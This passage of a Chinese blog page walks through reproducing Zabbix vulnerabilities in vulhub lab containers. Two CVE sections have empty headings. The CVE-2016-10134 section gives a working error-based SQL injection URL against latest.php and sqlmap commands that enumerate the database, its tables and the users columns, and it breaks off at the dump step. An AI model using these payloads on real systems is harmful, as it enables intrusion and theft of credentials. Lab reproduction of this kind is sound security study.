+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#%e6%bc%8f%e6%b4%9e%e5%8e%9f%e7%90%86-1">漏洞原理
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0-1">漏洞复现
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#%e5%a6%82%e4%bd%95%e4%bf%ae%e5%a4%8d-1">如何修复
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#zabbix-latestphp-sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9ecve-2016-10134">Zabbix latest.php SQL注入漏洞（CVE-2016-10134）
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#%e9%9d%b6%e5%9c%ba%e6%90%ad%e5%bb%ba-2">靶场搭建
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#%e6%bc%8f%e6%b4%9e%e5%8e%9f%e7%90%86-2">漏洞原理
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0-2">漏洞复现
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-8 hx:rtl:pr-8 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#%e9%80%9a%e8%bf%87latestphp%e8%a7%a6%e5%8f%91sql%e6%b3%a8%e5%85%a5">通过latest.php触发sql注入
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-12 hx:rtl:pr-12 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#%e7%99%bb%e5%bd%95guest%e7%94%a8%e6%88%b7">登录guest用户
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-12 hx:rtl:pr-12 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#%e4%b8%8d%e7%99%bb%e5%bd%95%e4%bb%bb%e4%bd%95%e7%94%a8%e6%88%b7">不登录任何用户
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-8 hx:rtl:pr-8 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#%e9%80%9a%e8%bf%87jsrpcphp%e8%a7%a6%e5%8f%91sql%e6%b3%a8%e5%85%a5">通过jsrpc.php触发sql注入
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#%e5%a6%82%e4%bd%95%e4%bf%ae%e5%a4%8d-2">如何修复
+        </a>
+      </li></ul>
+      <div class="hx:mt-8 hx:border-t hx:bg-white hx:pt-8 hx:shadow-[0_-12px_16px_white] hx:dark:bg-dark hx:dark:shadow-[0_-12px_16px_#111] hx:sticky hx:bottom-0 hx:flex hx:flex-col hx:items-start hx:gap-2 hx:pb-8 hx:border-gray-200 hx:dark:border-neutral-800 hx:contrast-more:border-t hx:contrast-more:border-neutral-400 hx:contrast-more:shadow-none hx:contrast-more:dark:border-neutral-400">
+        <button aria-hidden="true" id="backToTop" onClick="scrollUp();" class="hx:cursor-pointer hx:transition-all hx:duration-75 hx:opacity-0 hx:text-xs hx:font-medium hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-100 hx:contrast-more:text-gray-800 hx:contrast-more:dark:text-gray-50">
+          <span>返回顶部</span>
+          <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="hx:inline hx:ltr:ml-1 hx:rtl:mr-1 hx:h-3.5 hx:w-3.5 hx:rounded-full hx:border hx:border-gray-500 hx:hover:border-gray-900 hx:dark:border-gray-400 hx:dark:hover:border-gray-100 hx:contrast-more:border-gray-800 hx:contrast-more:dark:border-gray-50">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M4.5 15.75l7.5-7.5 7.5 7.5" />
+          </svg>
+        </button>
+      </div>
+    </div>
+  </nav>
+
+
+    <article class="hx:w-full hx:break-words hx:flex hx:min-h-[calc(100vh-var(--navbar-height))] hx:min-w-0 hx:justify-center hx:pb-8 hx:pr-[calc(env(safe-area-inset-right)-1.5rem)]">
+      <main class="hx:w-full hx:min-w-0 hx:max-w-6xl hx:px-6 hx:pt-4 hx:md:px-12">
+        <div class="hx:mt-1.5 hx:flex hx:items-center hx:gap-1 hx:overflow-hidden hx:text-sm hx:text-gray-500 hx:dark:text-gray-400 hx:contrast-more:text-current">
+        <div class="hx:whitespace-nowrap hx:transition-colors hx:min-w-[24px] hx:overflow-hidden hx:text-ellipsis hx:hover:text-gray-900 hx:dark:hover:text-gray-100">
+          <a href="/vul/">Vul</a>
+        </div><svg class="hx:w-3.5 hx:shrink-0 hx:rtl:-rotate-180" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7"/></svg><div class="hx:whitespace-nowrap hx:transition-colors hx:font-medium hx:text-gray-700 hx:contrast-more:font-bold hx:contrast-more:text-current hx:dark:text-gray-100 hx:contrast-more:dark:text-current">Zabbix历史漏洞复现</div>
+  </div>
+
+        <h1 class="hx:mt-2 hx:text-4xl hx:font-bold hx:tracking-tight hx:text-slate-900 hx:dark:text-slate-100">Zabbix历史漏洞复现</h1>
+        <div class="hx:mt-4 hx:mb-16 hx:text-gray-500 hx:dark:text-gray-400 hx:text-sm hx:flex hx:items-center hx:flex-wrap hx:gap-y-2"><span class="hx:mr-1">January 26, 2026</span></div>
+        <div class="content">
+          <h2>介绍<span class="hx:absolute hx:-mt-20" id="介绍"></span>
+    <a href="#%e4%bb%8b%e7%bb%8d" class="subheading-anchor" aria-label="Permalink for this section"></a></h2><p>Zabbix 是一款功能强大的开源企业级监控解决方案，旨在监控 IT 基础设施的各个方面，包括网络设备、服务器、云服务、虚拟机和应用程序。
+Zabbix 的核心功能</p>
+<ul>
+<li>多维度监控： 支持 SNMP、IPMI、JMX、Zabbix Agent、无 Agent 监控等多种方式。</li>
+<li>实时告警： 当系统出现异常（如 CPU 过高、硬盘空间不足）时，通过邮件、微信、钉钉或短信通知管理员。</li>
+<li>可视化展示： 提供仪表盘（Dashboards）、拓扑图（Maps）和详细的图表。</li>
+<li>自动发现： 能够自动扫描网络并添加新发现的主机，无需手动一个个录入。</li>
+</ul>
+<h2>Zabbix Server Active Proxy Trapper 命令注入漏洞修复绕过（CVE-2020-11800）<span class="hx:absolute hx:-mt-20" id="zabbix-server-active-proxy-trapper-命令注入漏洞修复绕过cve-2020-11800"></span>
+    <a href="#zabbix-server-active-proxy-trapper-%e5%91%bd%e4%bb%a4%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e%e4%bf%ae%e5%a4%8d%e7%bb%95%e8%bf%87cve-2020-11800" class="subheading-anchor" aria-label="Permalink for this section"></a></h2><blockquote>
+  <p>靶场环境：vulhub/zabbix/CVE-2020-11800</p>
+
+</blockquote>
+<h3>靶场搭建<span class="hx:absolute hx:-mt-20" id="靶场搭建"></span>
+    <a href="#%e9%9d%b6%e5%9c%ba%e6%90%ad%e5%bb%ba" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>git clone https://github.com/vulhub/vulhub.git
+</span></span><span style="display:flex;"><span>cd vulhub/zabbix/CVE-2020-11800
+</span></span><span style="display:flex;"><span>docker compose up -d</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="复制代码"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>启动一个完整的Zabbix环境，包含Web端、Server端、1个Agent和Mysql数据库，启动完成后执行<code>docker compose ps</code>查看容器是否全部成功启动，如果没有，可以尝试重新执行<code>docker compose up -d</code></p>
+<h3>漏洞原理<span class="hx:absolute hx:-mt-20" id="漏洞原理"></span>
+    <a href="#%e6%bc%8f%e6%b4%9e%e5%8e%9f%e7%90%86" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><h3>漏洞复现<span class="hx:absolute hx:-mt-20" id="漏洞复现"></span>
+    <a href="#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><h3>如何修复<span class="hx:absolute hx:-mt-20" id="如何修复"></span>
+    <a href="#%e5%a6%82%e4%bd%95%e4%bf%ae%e5%a4%8d" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><h2>Zabbix Server Active Proxy Trapper 命令注入漏洞（CVE-2017-2824）<span class="hx:absolute hx:-mt-20" id="zabbix-server-active-proxy-trapper-命令注入漏洞cve-2017-2824"></span>
+    <a href="#zabbix-server-active-proxy-trapper-%e5%91%bd%e4%bb%a4%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9ecve-2017-2824" class="subheading-anchor" aria-label="Permalink for this section"></a></h2><blockquote>
+  <p>靶场环境：vulhub/zabbix/CVE-2017-2824</p>
+
+</blockquote>
+<h3>靶场搭建<span class="hx:absolute hx:-mt-20" id="靶场搭建-1"></span>
+    <a href="#%e9%9d%b6%e5%9c%ba%e6%90%ad%e5%bb%ba-1" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>git clone https://github.com/vulhub/vulhub.git
+</span></span><span style="display:flex;"><span>cd vulhub/zabbix/CVE-2017-2824
+</span></span><span style="display:flex;"><span>docker compose up -d</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="复制代码"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>启动一个完整的Zabbix环境，包含Web端、Server端、1个Agent和Mysql数据库，启动完成后执行<code>docker compose ps</code>查看容器是否全部成功启动，如果没有，可以尝试重新执行<code>docker compose up -d</code></p>
+<h3>漏洞原理<span class="hx:absolute hx:-mt-20" id="漏洞原理-1"></span>
+    <a href="#%e6%bc%8f%e6%b4%9e%e5%8e%9f%e7%90%86-1" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><h3>漏洞复现<span class="hx:absolute hx:-mt-20" id="漏洞复现-1"></span>
+    <a href="#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0-1" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><h3>如何修复<span class="hx:absolute hx:-mt-20" id="如何修复-1"></span>
+    <a href="#%e5%a6%82%e4%bd%95%e4%bf%ae%e5%a4%8d-1" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><h2>Zabbix latest.php SQL注入漏洞（CVE-2016-10134）<span class="hx:absolute hx:-mt-20" id="zabbix-latestphp-sql注入漏洞cve-2016-10134"></span>
+    <a href="#zabbix-latestphp-sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9ecve-2016-10134" class="subheading-anchor" aria-label="Permalink for this section"></a></h2><blockquote>
+  <p>靶场环境：vulhub/zabbix/CVE-2016-10134</p>
+
+</blockquote>
+<h3>靶场搭建<span class="hx:absolute hx:-mt-20" id="靶场搭建-2"></span>
+    <a href="#%e9%9d%b6%e5%9c%ba%e6%90%ad%e5%bb%ba-2" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>git clone https://github.com/vulhub/vulhub.git
+</span></span><span style="display:flex;"><span>cd vulhub/zabbix/CVE-2016-10134
+</span></span><span style="display:flex;"><span>docker compose up -d</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="复制代码"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>启动一个完整的Zabbix环境，包含Web端、Server端、1个Agent和Mysql数据库</p>
+<ol>
+<li>启动完成后执行<code>docker compose ps -a</code>查看容器是否全部成功启动
+
+    <img src="../imgs/1a122aa4c534d3501864f01c6356de2c.png" alt=""  loading="lazy" /></li>
+<li>这里发现有一个容器没有启动成功，重新执行<code>docker compose up -d</code>
+
+    <img src="../imgs/e4ffc9148aee52cd21335436f6479149.png" alt=""  loading="lazy" />
+此时靶场启动成功</li>
+</ol>
+<h3>漏洞原理<span class="hx:absolute hx:-mt-20" id="漏洞原理-2"></span>
+    <a href="#%e6%bc%8f%e6%b4%9e%e5%8e%9f%e7%90%86-2" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>在Zabbix版本2.2.14和3.0.4之前，<code>latest.php</code>文件存在SQL注入漏洞。该漏洞允许远程攻击者通过<code>toggle_ids</code>数组参数在latest.php中执行任意SQL命令。该漏洞也可以通过jsrpc.php利用，且无需任何用户身份。
+漏洞的根源在于 <code>latest.php</code> 接收 <code>toggle_ids[]</code> 参数时，直接将其带入了数据库查询语句，而没有进行充分的预编译处理或类型检查。
+参考链接：</p>
+<ul>
+<li><a href="https://github.com/vulhub/vulhub/blob/master/zabbix/CVE-2016-10134/README.zh-cn.md"target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/zabbix/CVE-2016-10134/README.zh-cn.md</a></li>
+<li><a href="https://www.cnblogs.com/cute-puli/p/15659959.html"target="_blank" rel="noopener">https://www.cnblogs.com/cute-puli/p/15659959.html</a></li>
+</ul>
+<h3>漏洞复现<span class="hx:absolute hx:-mt-20" id="漏洞复现-2"></span>
+    <a href="#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0-2" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>访问<code>http://your-ip:8080</code>，用账号<code>guest</code>（密码为空）登录游客账户。
+
+    <img src="../imgs/43a9f5ab1568e3df1a210010e58d1611.png" alt=""  loading="lazy" /></p>
+<h4>通过latest.php触发sql注入<span class="hx:absolute hx:-mt-20" id="通过latestphp触发sql注入"></span>
+    <a href="#%e9%80%9a%e8%bf%87latestphp%e8%a7%a6%e5%8f%91sql%e6%b3%a8%e5%85%a5" class="subheading-anchor" aria-label="Permalink for this section"></a></h4><h5>登录guest用户<span class="hx:absolute hx:-mt-20" id="登录guest用户"></span>
+    <a href="#%e7%99%bb%e5%bd%95guest%e7%94%a8%e6%88%b7" class="subheading-anchor" aria-label="Permalink for this section"></a></h5><p>登录后，查看Cookie中的<code>zbx_sessionid</code>，复制后16位字符：
+
+    <img src="../imgs/65bcae85ad3290fa796aaa3ea4dcc3f3.png" alt=""  loading="lazy" />
+我这里的后16位是：</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><pre><code>2253121053f01ac9</code></pre></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="复制代码"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>将这16个字符作为sid的值，访问<code>http://your-ip:8080/latest.php?output=ajax&amp;sid=填写后16位&amp;favobj=toggle&amp;toggle_open_state=1&amp;toggle_ids[]=报错注入语句</code></p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><pre><code>http://192.168.79.111:8080/latest.php?output=ajax&amp;sid=2253121053f01ac9&amp;favobj=toggle&amp;toggle_open_state=1&amp;toggle_ids[]=updatexml(0,concat(0x7e,database()),0)</code></pre></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="复制代码"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>
+    <img src="../imgs/b41ec61293409324958fc70398c658e9.png" alt=""  loading="lazy" />
+发现成功注入，带出数据库名称zabbix
+还可以使用sqlmap去测试，在burp中将刚才的请求保存到文件
+
+    <img src="../imgs/74ea720c9985969b39143a864fdae225.png" alt=""  loading="lazy" />
+
+    <img src="../imgs/d741898042e3f9607e927ab2e807c1a6.png" alt=""  loading="lazy" />
+还需要对该文件，做一下修改
+
+    <img src="../imgs/9db8c30dff79bf341f5e50e0822c4518.png" alt=""  loading="lazy" />
+使用sqlmap，测试sql注入， &ndash;batch的意思，自动化默认选项，不再询问用户</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>python sqlmap.py -r 你保存请求的文件路径 --batch</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="复制代码"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>
+    <img src="../imgs/3d73e0b538648babfa1845d2ef645fc1.png" alt=""  loading="lazy" />
+观察sqlmap的结果，该注入点，存在内联查询，报错注入，时间盲注，接下来进一步利用</p>
+<ol>
+<li>获取数据库名 &ndash;dbs 获取数据库名</li>
+</ol>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>python sqlmap.py -r ../1.txt --batch --dbs</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="复制代码"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>
+    <img src="../imgs/bfb5a51241b028e88995227ea3018296.png" alt=""  loading="lazy" /></p>
+<ol start="2">
+<li>获取zabbix数据库的表名 &ndash;tables 获取表名 -D 指定数据库</li>
+</ol>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>python sqlmap.py -r ../1.txt --batch -D zabbix --tables</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="复制代码"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>
+    <img src="../imgs/ea6e3a360626e230b6ba2eaff2b482cc.png" alt=""  loading="lazy" /></p>
+<ol start="3">
+<li>获取zabbix数据库中users表的列名 &ndash;columns 获取列名 -T 指定表名</li>
+</ol>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>python sqlmap.py -r ../1.txt --batch -D zabbix -T users --columns</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="复制代码"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>
+    <img src="../imgs/23b8cbe5d3312bb164580c6d1b2859cd.png" alt=""  loading="lazy" /></p>
+<ol start="4">
+<li>获取表中的内容 &ndash;dump 获取数据 -C 指定列名</li>
+</ol>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
